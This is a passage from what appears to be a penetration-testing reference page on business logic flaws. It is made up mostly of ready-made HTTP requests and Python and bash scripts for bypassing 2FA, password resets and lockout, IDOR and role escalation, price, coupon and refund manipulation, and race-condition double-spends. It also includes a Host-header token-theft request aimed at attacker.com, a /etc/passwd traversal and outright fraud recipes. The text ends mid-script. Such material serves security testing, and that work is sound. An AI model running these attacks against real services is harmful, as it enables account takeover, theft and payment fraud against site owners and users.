---
title: Business Logic Flaws
description: Business Logic Flaws — authentication bypass, price manipulation, race conditions, workflow abuse, privilege escalation, API logic exploitation, payment fraud, feature abuse, and defense strategies for penetration testers and security researchers.
navigation:
  icon: i-lucide-workflow
  title: Business Logic Flaws
---

## What are Business Logic Flaws?

Business Logic Flaws are vulnerabilities that arise from **flawed design, implementation, or assumptions** in an application's workflow, rules, and processes — rather than from technical coding errors like injection or buffer overflows. These vulnerabilities exploit the **intended functionality** of an application in ways that developers never anticipated, allowing attackers to manipulate legitimate features to achieve unauthorized outcomes.

::callout{icon="i-lucide-info" color="blue"}
Business logic flaws are among the **most dangerous** and **hardest to detect** vulnerability classes. They cannot be found by automated scanners because they require **understanding the application's purpose, rules, and expected behavior**. Every business logic flaw is unique to the specific application.
::

Unlike technical vulnerabilities, business logic flaws:

- **Pass all input validation** — the input is technically valid
- **Don't trigger WAF rules** — no malicious characters or patterns
- **Evade automated scanning** — scanners don't understand business rules
- **Exploit legitimate features** — using the application as designed, but in unintended sequences or combinations
- **Require human understanding** — the tester must understand what the application is supposed to do

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Technical vs Logic Vulnerability"}

  | Aspect | Technical Vulnerability | Business Logic Flaw |
  |--------|----------------------|---------------------|
  | **Example** | SQL Injection in login form | Applying expired coupon codes |
  | **Input** | Malicious characters (`' OR 1=1`) | Perfectly valid data (`EXPIRED_COUPON_2020`) |
  | **Detection** | Automated scanners | Manual testing, understanding business rules |
  | **WAF Effective?** | Often yes | Almost never |
  | **Root Cause** | Missing input sanitization | Flawed business rule implementation |
  | **Fix** | Parameterized queries | Redesign business logic, add server-side checks |
  | **Uniqueness** | Common patterns across apps | Unique to each application |
  | **OWASP Category** | Injection (A03) | Broken Access Control / Design Flaws (A01/A04) |

  :::

  :::tabs-item{icon="i-lucide-code" label="Simple Example"}

  A transfer function that checks if the amount is valid but doesn't check if it's **negative**:

  ```python [transfer.py]
  @app.route('/transfer', methods=['POST'])
  def transfer():
      from_account = get_current_user_account()
      to_account = request.form.get('to_account')
      amount = float(request.form.get('amount'))
      
      # VULNERABLE — Only checks positive balance
      if from_account.balance >= amount:
          from_account.balance -= amount
          to_account.balance += amount
          db.session.commit()
          return "Transfer successful"
      
      return "Insufficient funds"
  ```

  **The flaw:** The application doesn't validate that `amount` is **positive**. An attacker sends `amount=-5000`:

  ```http
  POST /transfer HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  to_account=victim&amount=-5000
  ```

  Result: `from_account.balance -= (-5000)` → **adds $5,000** to attacker's account. The victim's account is debited instead.
  :::
::

---

## Flaw Categories

::card-group
  ::card
  ---
  title: Authentication Logic Flaws
  icon: i-lucide-lock-open
  ---
  Bypass login, 2FA, account lockout, password reset, and session management through workflow manipulation rather than credential attacks.
  ::

  ::card
  ---
  title: Authorization Logic Flaws
  icon: i-lucide-shield-off
  ---
  Access unauthorized resources, perform privileged actions, or escalate permissions by exploiting flawed access control decisions.
  ::

  ::card
  ---
  title: Financial & E-Commerce Flaws
  icon: i-lucide-credit-card
  ---
  Manipulate prices, quantities, discounts, currencies, refunds, and payment workflows to achieve financial gain.
  ::

  ::card
  ---
  title: Workflow & State Manipulation
  icon: i-lucide-git-branch
  ---
  Skip required steps, repeat beneficial steps, reverse completed processes, or manipulate multi-step workflows.
  ::

  ::card
  ---
  title: Race Conditions
  icon: i-lucide-timer
  ---
  Exploit timing windows in concurrent processing to duplicate transactions, bypass limits, or access resources during state transitions.
  ::

  ::card
  ---
  title: Input & Validation Logic
  icon: i-lucide-text-cursor-input
  ---
  Exploit assumptions about data types, ranges, formats, and boundary conditions that bypass validation without using malicious characters.
  ::

  ::card
  ---
  title: API & Integration Logic
  icon: i-lucide-webhook
  ---
  Exploit trust boundaries between APIs, microservices, and third-party integrations where business rules are inconsistently enforced.
  ::

  ::card
  ---
  title: Feature & Functionality Abuse
  icon: i-lucide-puzzle
  ---
  Misuse legitimate features (search, export, notification, referral programs) in ways that cause harm, data leakage, or resource abuse.
  ::
::

---

## Authentication Logic Flaws

### Multi-Factor Authentication Bypass

::collapsible
---
label: "2FA / MFA Bypass Techniques"
---

::steps{level="4"}

#### Direct Page Access After First Factor

After submitting valid username/password, skip the 2FA page and navigate directly to the authenticated area.

```http [Skip 2FA — Direct Dashboard Access]
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=victim&password=password123

# Instead of following redirect to /2fa-verify
# Navigate directly to:
GET /dashboard HTTP/1.1
Host: target.com
Cookie: session=SESSION_FROM_LOGIN
```

If the application sets an authenticated session after the first factor and only **client-side redirects** to the 2FA page, the session is already valid.

#### 2FA Code Reuse

Submit a previously valid 2FA code. If codes aren't invalidated after use:

```http [Reuse Previous Code]
POST /2fa-verify HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=123456
# Use the same code that worked before
# If codes have long validity windows or aren't marked as used
```

#### 2FA Code Brute Force — No Rate Limit

If the 2FA code is 4-6 digits and there's no rate limiting or lockout:

```http [Brute Force 4-Digit Code]
POST /2fa-verify HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=0000
code=0001
code=0002
...
code=9999
# Only 10,000 attempts for 4-digit codes
# ~1,000,000 for 6-digit codes
```

#### 2FA Backup Code Logic

Request backup codes, then use them to bypass 2FA entirely:

```http [Request Backup Codes Without 2FA]
GET /account/backup-codes HTTP/1.1
Cookie: session=FIRST_FACTOR_SESSION

# If backup code page is accessible after first factor only
```

#### 2FA Code in Response

Check if the 2FA code is leaked in the response body, headers, or JavaScript:

```http [Check Response for Code Leak]
POST /2fa/send HTTP/1.1
Content-Type: application/x-www-form-urlencoded

method=sms

# Check response body for: {"code": "123456"} or similar
# Check response headers for debug information
# Check JavaScript variables
```

#### Manipulate 2FA Method

Switch from a secure method (authenticator app) to a weaker method (email/SMS) or disable 2FA during the verification step:

```http [Switch 2FA Method]
POST /2fa-verify HTTP/1.1
Content-Type: application/x-www-form-urlencoded

method=email&code=ATTACKER_CONTROLLED_CODE
# If app allows method switching during verification
```

#### Null/Empty Code Submission

```http [Empty Code]
POST /2fa-verify HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=
```

```http [Null Value]
POST /2fa-verify HTTP/1.1
Content-Type: application/json

{"code": null}
```

```http [Zero Value]
POST /2fa-verify HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=0
```

```http [Array Value]
POST /2fa-verify HTTP/1.1
Content-Type: application/json

{"code": []}
```

```http [Boolean Value]
POST /2fa-verify HTTP/1.1
Content-Type: application/json

{"code": true}
```

#### Remove 2FA Parameter Entirely

```http [No Code Parameter]
POST /2fa-verify HTTP/1.1
Content-Type: application/x-www-form-urlencoded

submit=verify
# Omit the code parameter completely
```

::
::

### Password Reset Flaws

::collapsible
---
label: "Password Reset Logic Exploitation"
---

```http [Reset Token Reuse]
# Use a previously used reset token
GET /reset-password?token=PREVIOUSLY_USED_TOKEN HTTP/1.1
Host: target.com

# If tokens aren't invalidated after use
```

```http [Reset Token Predictability]
# If tokens are sequential or time-based
GET /reset-password?token=1001 HTTP/1.1
GET /reset-password?token=1002 HTTP/1.1

# Or timestamp-based
GET /reset-password?token=1719500000 HTTP/1.1
GET /reset-password?token=1719500001 HTTP/1.1
```

```http [Reset Without Token]
POST /reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=victim@target.com&new_password=hacked123

# Skip the token verification step entirely
```

```http [Reset Any User — IDOR]
POST /reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

token=YOUR_VALID_TOKEN&user_id=VICTIM_USER_ID&new_password=hacked123

# Use your valid token but change the user_id parameter
```

```http [Reset via User ID Instead of Token]
POST /reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user_id=1&new_password=hacked123

# If app accepts user_id without requiring token
```

```http [Token Not Tied to User]
# Request reset for YOUR account
# Get token: abc123
# Use token to reset VICTIM's password
POST /reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

token=abc123&email=victim@target.com&new_password=hacked
```

```http [Password Reset Race Condition]
# Send multiple password change requests simultaneously
# with different new passwords
# The last one to process wins
# Use this to override a legitimate user's password change
```

```http [Reset Token in Referer Header]
# After clicking reset link, navigate to external page
# The reset token leaks in the Referer header
GET /external-resource HTTP/1.1
Referer: https://target.com/reset-password?token=SECRET_TOKEN
```

```http [Host Header Poisoning — Token Theft]
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# Reset email contains: https://attacker.com/reset?token=SECRET
```
::

### Account Lockout Bypass

::collapsible
---
label: "Lockout & Rate Limit Bypass Techniques"
---

```http [IP Rotation — X-Forwarded-For]
POST /login HTTP/1.1
X-Forwarded-For: 1.1.1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=attempt1

# Next request:
POST /login HTTP/1.1
X-Forwarded-For: 1.1.1.2
Content-Type: application/x-www-form-urlencoded

username=admin&password=attempt2
```

```http [Case Sensitivity Bypass]
# Each variation may have its own lockout counter
POST /login HTTP/1.1
username=Admin&password=attempt1

POST /login HTTP/1.1
username=ADMIN&password=attempt2

POST /login HTTP/1.1
username=admin&password=attempt3

POST /login HTTP/1.1  
username=aDmIn&password=attempt4
```

```http [Unicode Normalization Bypass]
username=admin&password=attempt1
username=ɑdmin&password=attempt2     # Unicode 'ɑ' 
username=аdmin&password=attempt3     # Cyrillic 'а'
username=admin&password=attempt4     # Regular 'a'
```

```http [Whitespace/Special Char Bypass]
username=admin&password=attempt1
username=admin &password=attempt2     # Trailing space
username= admin&password=attempt3    # Leading space
username=admin%00&password=attempt4  # Null byte
username=admin%20&password=attempt5  # URL-encoded space
```

```http [Valid Login Between Attempts]
# Login with valid credentials between brute-force attempts
# to reset the lockout counter
POST /login: username=admin&password=wrong1
POST /login: username=admin&password=wrong2
POST /login: username=admin&password=CORRECT  # Resets counter
POST /login: username=admin&password=wrong3
POST /login: username=admin&password=wrong4
POST /login: username=admin&password=CORRECT  # Resets counter
# Continue brute-forcing without triggering lockout
```

```http [Credential Stuffing — Different Usernames]
# Lockout is per-account, so try one password across many accounts
POST /login: username=user1&password=Password123!
POST /login: username=user2&password=Password123!
POST /login: username=user3&password=Password123!
# Never triggers per-account lockout
```

```http [Login via Different Endpoints]
# Try login through different endpoints
POST /login
POST /api/v1/login
POST /api/v2/auth
POST /mobile/login
POST /oauth/token
POST /graphql (with login mutation)
# Each endpoint may have separate rate limiting
```

```http [JSON vs Form Data]
# Switch content types to reset counters
POST /login (application/x-www-form-urlencoded)
POST /login (application/json)
POST /login (multipart/form-data)
POST /login (application/xml)
```
::

### Session Logic Flaws

::collapsible
---
label: "Session Management Exploitation"
---

```http [Session Doesn't Expire After Password Change]
# Login and get session
# Change password
# Old session still valid
GET /dashboard HTTP/1.1
Cookie: session=OLD_SESSION_BEFORE_PASSWORD_CHANGE
```

```http [Session Not Invalidated After Logout]
# Logout
POST /logout HTTP/1.1
Cookie: session=CURRENT_SESSION

# Reuse the same session
GET /dashboard HTTP/1.1
Cookie: session=CURRENT_SESSION
# If still works, session wasn't invalidated server-side
```

```http [Concurrent Session Abuse]
# Login from multiple locations simultaneously
# If app doesn't limit concurrent sessions
# Attacker's session persists after victim changes password
```

```http [Session Fixation — Pre-authentication Session]
# Get a session ID before authentication
GET /login HTTP/1.1
# Response: Set-Cookie: session=KNOWN_SESSION_ID

# Trick victim into authenticating with this session
# If the session ID doesn't change after authentication:
GET /dashboard HTTP/1.1
Cookie: session=KNOWN_SESSION_ID
# Attacker accesses victim's authenticated session
```

```http [Session in URL — Leakage via Referer]
# If session token is in URL:
GET /dashboard?session=SECRET_TOKEN HTTP/1.1

# Click any external link → Referer header leaks token
GET /external HTTP/1.1
Referer: https://target.com/dashboard?session=SECRET_TOKEN
```

```http [Remember Me Token Manipulation]
# If "Remember Me" token is predictable
Cookie: remember_me=user_id_base64:timestamp:weak_hash
# Forge token for another user
Cookie: remember_me=MQ==:1719500000:predicted_hash
```

```http [Session Role Not Updated After Role Change]
# Admin demotes user to basic role
# User's existing session still has admin privileges
# Session role stored at login time, never refreshed
GET /admin/panel HTTP/1.1
Cookie: session=SESSION_WITH_OLD_ADMIN_ROLE
```
::

---

## Authorization Logic Flaws

### Insecure Direct Object References (IDOR)

::collapsible
---
label: "IDOR — Accessing Unauthorized Resources"
---

```http [Sequential ID Enumeration]
GET /api/users/1001 HTTP/1.1      # Your profile
GET /api/users/1002 HTTP/1.1      # Another user's profile
GET /api/users/1 HTTP/1.1         # Admin profile (usually ID 1)
```

```http [UUID-Based IDOR]
# UUIDs aren't sequential but may be leaked in:
# - API responses listing users
# - URL parameters in shared links
# - JavaScript files
# - WebSocket messages
# - Email headers/links
GET /api/documents/550e8400-e29b-41d4-a716-446655440000 HTTP/1.1
```

```http [File Download IDOR]
GET /download?file_id=invoice_1001.pdf HTTP/1.1    # Your invoice
GET /download?file_id=invoice_1002.pdf HTTP/1.1    # Another user's invoice
GET /download?file_id=../../etc/passwd HTTP/1.1     # Path traversal
```

```http [IDOR via POST Body]
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{"user_id": 1002, "email": "attacker@evil.com"}
# Modify another user's email
```

```http [IDOR via HTTP Method Change]
# GET may be restricted but PUT/PATCH/DELETE might not check authorization
GET /api/users/1002 HTTP/1.1      # 403 Forbidden
PUT /api/users/1002 HTTP/1.1      # 200 OK — updates user
DELETE /api/users/1002 HTTP/1.1   # 200 OK — deletes user
```

```http [IDOR in GraphQL]
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "{ user(id: 1002) { name email password_hash ssn } }"
}
```

```http [IDOR via Unpredictable but Leaked IDs]
# Step 1: Create a shared resource
POST /api/documents/share HTTP/1.1
{"doc_id": 5001, "share_with": "attacker@evil.com"}

# Step 2: API response leaks other document IDs
# {"shared_docs": [5001, 5002, 5003, 4999]}

# Step 3: Access leaked document IDs
GET /api/documents/4999 HTTP/1.1
```

```http [Horizontal IDOR — Same Role, Different User]
# As User A, access User B's resources
GET /api/orders?user_id=USER_B_ID HTTP/1.1
Authorization: Bearer USER_A_TOKEN
```

```http [Vertical IDOR — Different Role Access]
# As regular user, access admin resources
GET /api/admin/users HTTP/1.1
Authorization: Bearer REGULAR_USER_TOKEN

GET /api/admin/config HTTP/1.1
Authorization: Bearer REGULAR_USER_TOKEN
```
::

### Privilege Escalation via Logic

::collapsible
---
label: "Role & Permission Escalation Techniques"
---

```http [Self-Registration with Admin Role]
POST /register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "password123",
  "role": "admin"
}
# If app doesn't restrict role field during registration
```

```http [Profile Update — Role Injection]
PUT /api/profile HTTP/1.1
Content-Type: application/json

{
  "name": "Attacker",
  "email": "attacker@evil.com",
  "role": "administrator",
  "is_admin": true,
  "permissions": ["read", "write", "delete", "manage_users"]
}
# If mass assignment is possible
```

```http [Invitation Link — Role Manipulation]
# Invitation URL: /invite?token=abc123&role=viewer
# Change role parameter:
GET /invite?token=abc123&role=admin HTTP/1.1
```

```http [API Versioning — Unprotected Older API]
# v2 API has access controls
GET /api/v2/admin/users HTTP/1.1    # 403 Forbidden

# v1 API lacks access controls  
GET /api/v1/admin/users HTTP/1.1    # 200 OK — Full access
```

```http [Admin Functionality via Direct URL]
# Admin pages with no server-side authorization check
GET /admin HTTP/1.1                     # Redirects to login
GET /admin/dashboard HTTP/1.1           # Also redirects
GET /admin/users/list HTTP/1.1          # Might work!
GET /admin/settings HTTP/1.1
GET /admin/export/users.csv HTTP/1.1
GET /internal/debug HTTP/1.1
GET /management/console HTTP/1.1
```

```http [HTTP Method Override]
# Application blocks DELETE for non-admins
DELETE /api/users/1002 HTTP/1.1         # 403 Forbidden

# Try method override headers
POST /api/users/1002 HTTP/1.1
X-HTTP-Method-Override: DELETE

POST /api/users/1002 HTTP/1.1
X-HTTP-Method: DELETE

POST /api/users/1002?_method=DELETE HTTP/1.1
```

```http [Bulk Operation Without Per-Item Auth]
POST /api/bulk/delete HTTP/1.1
Content-Type: application/json

{
  "ids": [1001, 1002, 1003, 1004, 1005]
}
# App checks if user can perform bulk operations
# But doesn't check authorization for EACH individual item
```

```http [Permission Caching — Stale Permissions]
# Admin grants temporary admin access
# Admin revokes access
# But permissions are cached for 30 minutes
# User retains admin access until cache expires
GET /admin/dashboard HTTP/1.1
Cookie: session=SESSION_WITH_CACHED_ADMIN_PERMS
```
::

---

## Financial & E-Commerce Flaws

### Price Manipulation

::collapsible
---
label: "Price & Payment Manipulation Techniques"
---

```http [Client-Side Price — Modify Hidden Field]
POST /checkout HTTP/1.1
Content-Type: application/x-www-form-urlencoded

product_id=LAPTOP&quantity=1&price=0.01
# If price is sent from client and trusted by server
```

```http [Negative Price]
POST /cart/add HTTP/1.1
Content-Type: application/json

{"product_id": 100, "price": -500.00, "quantity": 1}
# Negative price adds credit to the cart total
```

```http [Zero Price Checkout]
POST /checkout HTTP/1.1
Content-Type: application/json

{"items": [{"id": 100, "price": 0}], "payment_method": "credit_card"}
```

```http [Decimal Precision Exploitation]
POST /transfer HTTP/1.1
Content-Type: application/json

{"amount": 0.009, "to": "attacker_account"}
# If rounded up to 0.01 when crediting but 0.00 when debiting
# Repeat millions of times — "salami attack"
```

```http [Currency Mismatch]
POST /purchase HTTP/1.1
Content-Type: application/json

{
  "product_id": 100,
  "amount": 100,
  "currency": "IDR"
}
# Pay 100 Indonesian Rupiah instead of 100 USD
# Application doesn't validate currency matches product listing
```

```http [Price Race Condition — Add to Cart During Sale]
# Product is $100, sale starts at 12:00 making it $50
# At 11:59:59, add to cart at $100
# At 12:00:01, the sale price applies

# Reverse: add to cart during sale, checkout after sale ends
# Cart might retain the sale price
```

```http [Gift Card Generation Abuse]
POST /giftcard/purchase HTTP/1.1
Content-Type: application/json

{"value": 100, "payment_amount": 100, "quantity": 1}

# Modify:
{"value": 1000, "payment_amount": 100, "quantity": 1}
# Buy $1000 gift card for $100
```

```http [Coupon Applied After Payment Calculated]
# Step 1: Start checkout — total is $500
POST /checkout/start
{"cart_id": 100}

# Step 2: Apply coupon AFTER payment amount is locked
POST /checkout/apply-coupon
{"code": "HALFOFF", "cart_id": 100}

# Step 3: Pay the original $500 but receive $1000 worth
# Because coupon doubled the items instead of halving the price
```

```http [Tax Exemption Manipulation]
POST /checkout HTTP/1.1
Content-Type: application/json

{
  "items": [{"id": 100}],
  "tax_exempt": true,
  "tax_id": "000-00-0000"
}
# If tax exemption is a client-controlled boolean
```

```http [Shipping Cost Manipulation]
POST /checkout HTTP/1.1
Content-Type: application/json

{
  "items": [{"id": 100}],
  "shipping_method": "premium",
  "shipping_cost": 0
}
# Get premium shipping for free
```
::

### Discount & Coupon Abuse

::collapsible
---
label: "Coupon, Discount & Promotion Exploitation"
---

```http [Coupon Reuse — No Single-Use Enforcement]
POST /apply-coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=SAVE50

# Apply the same coupon multiple times
# Or use it across multiple orders
```

```http [Coupon Code Enumeration]
POST /apply-coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=SAVE10
code=SAVE20
code=SAVE30
code=SAVE50
code=SAVE100
code=SAVE75
code=FREE
code=HALFOFF
code=EMPLOYEE50
code=VIP100
code=INTERNAL
code=TEST100
code=ADMIN50
```

```http [Expired Coupon Acceptance]
POST /apply-coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=BLACKFRIDAY2023
# Expired coupon still accepted because expiry check is client-side
```

```http [Stack Multiple Coupons]
POST /apply-coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=SAVE10

# Apply second coupon
POST /apply-coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=SAVE20

# Apply third coupon
POST /apply-coupon HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=SAVE30

# Total: 60% discount if stacking isn't prevented
```

```http [Coupon Applied to Excluded Items]
POST /checkout HTTP/1.1
Content-Type: application/json

{
  "items": [
    {"id": 100, "category": "electronics"},
    {"id": 200, "category": "sale_items"}
  ],
  "coupon": "ELECTRONICS20"
}
# Coupon for electronics also discounts sale items
# If exclusion logic only checks first item
```

```http [Percentage > 100%]
POST /admin/coupon/create HTTP/1.1
Content-Type: application/json

{
  "code": "OVERPAY",
  "type": "percentage",
  "value": 150
}
# 150% discount — customer gets paid to buy
```

```http [Negative Discount (Add Cost)]
POST /apply-coupon HTTP/1.1
Content-Type: application/json

{"code": "SPECIAL", "discount_value": -50}
# If discount is subtracted: total += 50 (for another user's order)
```

```http [Referral Code Self-Referral]
POST /register HTTP/1.1
Content-Type: application/json

{
  "username": "newuser",
  "referral_code": "MYOWNCODE"
}
# Earn referral bonus for referring yourself
# Create multiple accounts for infinite referral credits
```

```http [Loyalty Points Manipulation]
POST /redeem-points HTTP/1.1
Content-Type: application/json

{"points": -1000, "action": "redeem"}
# Negative redemption adds points instead of subtracting
```
::

### Refund & Return Abuse

::collapsible
---
label: "Refund Logic Exploitation"
---

```http [Refund More Than Paid]
POST /refund HTTP/1.1
Content-Type: application/json

{
  "order_id": 5000,
  "refund_amount": 999.99
}
# Original order was $99.99
# Refund $999.99 if amount isn't validated against order total
```

```http [Double Refund]
# Request refund simultaneously from multiple endpoints
POST /api/refund HTTP/1.1
{"order_id": 5000}

POST /support/refund HTTP/1.1
{"ticket_id": "REF-5000"}

# Or race condition — send same refund request twice simultaneously
```

```http [Refund to Different Payment Method]
POST /refund HTTP/1.1
Content-Type: application/json

{
  "order_id": 5000,
  "refund_to": "gift_card",
  "gift_card_number": "ATTACKER_CARD"
}
# Pay with stolen credit card
# Refund to attacker's gift card
# Effectively launders the stolen card
```

```http [Return Without Shipping Back]
# Step 1: Request return label
POST /return/request
{"order_id": 5000}

# Step 2: Receive refund
# Step 3: Never actually ship the item back
# If refund is issued when return is REQUESTED not RECEIVED
```

```http [Partial Refund Abuse]
# Order: 3 items totaling $300
POST /refund HTTP/1.1
{"order_id": 5000, "item_id": 1, "reason": "defective"}
# Refund item 1: $100

POST /refund HTTP/1.1
{"order_id": 5000, "item_id": 2, "reason": "wrong_size"}
# Refund item 2: $100

POST /refund HTTP/1.1
{"order_id": 5000, "item_id": 3, "reason": "not_as_described"}
# Refund item 3: $100

# Total refunded: $300
# Items kept: all 3
```

```http [Refund After Chargeback]
# Step 1: Purchase item
# Step 2: Request refund from merchant
# Step 3: Also file chargeback with bank
# Receive double refund — from merchant AND bank
```
::

---

## Workflow & State Manipulation

### Multi-Step Process Abuse

::collapsible
---
label: "Workflow Step Skipping & Manipulation"
---

```http [Skip Payment Step]
# Normal flow: Cart → Shipping → Payment → Confirmation
# Attack: Cart → Shipping → Confirmation (skip payment)

# Step 1: Add items to cart
POST /cart/add
{"product_id": 100}

# Step 2: Set shipping address  
POST /checkout/shipping
{"address": "123 Main St"}

# Step 3: SKIP payment, go directly to confirmation
POST /checkout/confirm
{"order_id": "ORD-123"}
# If confirmation endpoint doesn't verify payment was completed
```

```http [Repeat Beneficial Step]
# Step in workflow grants credits/rewards
POST /survey/complete
{"survey_id": 1}
# Rewards: +100 points

# Replay the same request
POST /survey/complete
{"survey_id": 1}
# Rewards: +100 points again

# Repeat indefinitely for infinite points
```

```http [Reverse Completed Process]
# Order completed and delivered
# Change order status back to "processing"
PUT /api/orders/5000
{"status": "processing"}

# Then request cancellation + refund
POST /api/orders/5000/cancel
# Get refund for already-received item
```

```http [Manipulate Step Counter]
# Application tracks checkout step: 1→2→3→4
POST /checkout/step
{"current_step": 4, "action": "confirm"}
# Skip from step 1 directly to step 4
```

```http [Bypass Approval Workflow]
# Normal: Request → Manager Approval → Execution
POST /expense/submit
{"amount": 50000, "status": "pending_approval"}

# Directly set status to approved
POST /expense/submit
{"amount": 50000, "status": "approved"}

# Or directly hit the execution endpoint
POST /expense/execute
{"expense_id": 1001}
```

```http [Bypass KYC/Verification]
# Application requires identity verification before withdrawal
# But the withdrawal API doesn't check verification status
POST /api/withdraw
{"amount": 10000, "account": "attacker_bank"}
# Works without completing KYC
```

```http [Bypass Terms Acceptance]
POST /api/signup/complete HTTP/1.1
Content-Type: application/json

{
  "username": "user",
  "terms_accepted": true,
  "age_verified": true,
  "kyc_complete": true
}
# Client sends verification flags that server trusts
```
::

### State Transition Abuse

::collapsible
---
label: "State Machine & Transition Exploitation"
---

```text [Invalid State Transitions]
Normal order flow:
  CREATED → PAID → PROCESSING → SHIPPED → DELIVERED

Attack transitions:
  CREATED → DELIVERED      (skip payment)
  SHIPPED → CREATED        (reverse to cancel after shipping)
  DELIVERED → PROCESSING   (trigger re-shipment)
  REFUNDED → PAID          (reverse refund)
  CANCELLED → PROCESSING   (reactivate cancelled order)
```

```http [Force State Change via API]
PUT /api/orders/5000 HTTP/1.1
Content-Type: application/json

{"status": "delivered"}
# If API doesn't enforce valid state transitions
# Order marked as delivered without shipping
```

```http [Subscription State Manipulation]
PUT /api/subscription HTTP/1.1
Content-Type: application/json

{
  "status": "active",
  "plan": "enterprise",
  "billing_period_end": "2030-12-31"
}
# Extend subscription indefinitely
# Upgrade plan without payment
```

```http [Account State Bypass]
# Account suspended/banned
# But API endpoints don't check account state
POST /api/post/create HTTP/1.1
Authorization: Bearer SUSPENDED_USER_TOKEN
Content-Type: application/json

{"content": "Still posting from suspended account"}
```

```http [Trial Period Extension]
# Trial expires after 14 days
# Delete trial_start cookie/parameter
# Or set it to future date
POST /api/account/update HTTP/1.1
Content-Type: application/json

{"trial_start": "2030-01-01"}
```

```http [Downgrade-Upgrade Feature Retention]
# Step 1: Subscribe to Premium plan
# Step 2: Use Premium features to generate data/reports
# Step 3: Downgrade to Free plan
# Step 4: Data/reports created during Premium still accessible
# Step 5: Re-access Premium features through cached/stored tokens
```
::

---

## Race Conditions

::note
Race conditions exploit **timing windows** where the application processes multiple requests concurrently without proper synchronization. The attack window may be **milliseconds** wide, requiring precise timing or high-volume concurrent requests.
::

### Understanding Race Conditions

::tabs
  :::tabs-item{icon="i-lucide-eye" label="How Race Conditions Work"}
  
  **Normal (Sequential) Processing:**
  ```text
  Request 1: Check balance ($100) → Deduct $80 → Balance = $20
  Request 2: Check balance ($20) → Insufficient funds → Rejected
  ```

  **Race Condition (Concurrent) Processing:**
  ```text
  Request 1: Check balance ($100) →                    → Deduct $80 → Balance = $20
  Request 2:                       → Check balance ($100) →          → Deduct $80 → Balance = -$60
  ```

  Both requests see $100 balance before either deduction completes. Both succeed, overdrawing the account.
  :::

  :::tabs-item{icon="i-lucide-code" label="Vulnerable Code"}
  ```python [transfer.py]
  @app.route('/transfer', methods=['POST'])
  def transfer():
      user = get_current_user()
      amount = float(request.form['amount'])
      
      # VULNERABLE — Check and update are not atomic
      # Time-of-check-to-time-of-use (TOCTOU) vulnerability
      
      # CHECK: Read balance
      balance = db.query("SELECT balance FROM accounts WHERE id = ?", user.id)
      
      # Window of vulnerability — another request can execute here
      
      if balance >= amount:
          # USE: Deduct balance
          db.query("UPDATE accounts SET balance = balance - ? WHERE id = ?", amount, user.id)
          db.query("UPDATE accounts SET balance = balance + ? WHERE id = ?", amount, to_account)
          return "Success"
      
      return "Insufficient funds"
  ```
  :::
::

### Race Condition Attack Techniques

::collapsible
---
label: "Financial Race Conditions"
---

```python [Double-Spend Attack — Python]
import threading
import requests

TARGET = "http://target.com/transfer"
COOKIES = {"session": "YOUR_SESSION_COOKIE"}
DATA = {
    "to_account": "attacker_second_account",
    "amount": "1000"
}

def send_transfer():
    requests.post(TARGET, data=DATA, cookies=COOKIES)

# Send 20 concurrent transfer requests
threads = []
for i in range(20):
    t = threading.Thread(target=send_transfer)
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()

# If balance is $1000, multiple requests may succeed
# before the first deduction is committed
print("All requests sent simultaneously")
```

```bash [Double-Spend — cURL Parallel]
# Using GNU Parallel
seq 1 50 | parallel -j50 "curl -s -X POST http://target.com/transfer \
  -H 'Cookie: session=YOUR_SESSION' \
  -d 'to_account=attacker&amount=1000'"
```

```python [Gift Card Race — Redeem Same Card Multiple Times]
import threading
import requests

def redeem_card():
    requests.post("http://target.com/redeem", 
        data={"card_code": "GIFT-CARD-123", "amount": 100},
        cookies={"session": "ATTACKER_SESSION"})

threads = [threading.Thread(target=redeem_card) for _ in range(30)]
for t in threads: t.start()
for t in threads: t.join()
# Multiple redemptions of the same gift card
```

```python [Withdrawal Race — Overdraw Account]
import asyncio
import aiohttp

async def withdraw(session):
    async with session.post("http://target.com/api/withdraw",
        json={"amount": 500},
        headers={"Authorization": "Bearer TOKEN"}) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        # Send 100 concurrent withdrawal requests
        tasks = [withdraw(session) for _ in range(100)]
        results = await asyncio.gather(*tasks)
        
        successes = [r for r in results if r.get('status') == 'success']
        print(f"Successful withdrawals: {len(successes)}")
        print(f"Total withdrawn: ${len(successes) * 500}")

asyncio.run(main())
```
::

::collapsible
---
label: "Non-Financial Race Conditions"
---

```python [Coupon Race — Multiple Redemptions]
import threading
import requests

def apply_coupon():
    requests.post("http://target.com/apply-coupon",
        data={"code": "SINGLE_USE_COUPON"},
        cookies={"session": "SESSION"})

threads = [threading.Thread(target=apply_coupon) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
# Single-use coupon applied multiple times
```

```python [Vote Race — Multiple Votes]
import threading
import requests

def vote():
    requests.post("http://target.com/vote",
        data={"candidate": "A"},
        cookies={"session": "SESSION"})

# Cast 100 simultaneous votes
threads = [threading.Thread(target=vote) for _ in range(100)]
for t in threads: t.start()
for t in threads: t.join()
```

```python [Follow/Like Race — Inflate Counts]
import threading
import requests

def like_post():
    requests.post("http://target.com/api/posts/123/like",
        headers={"Authorization": "Bearer TOKEN"})

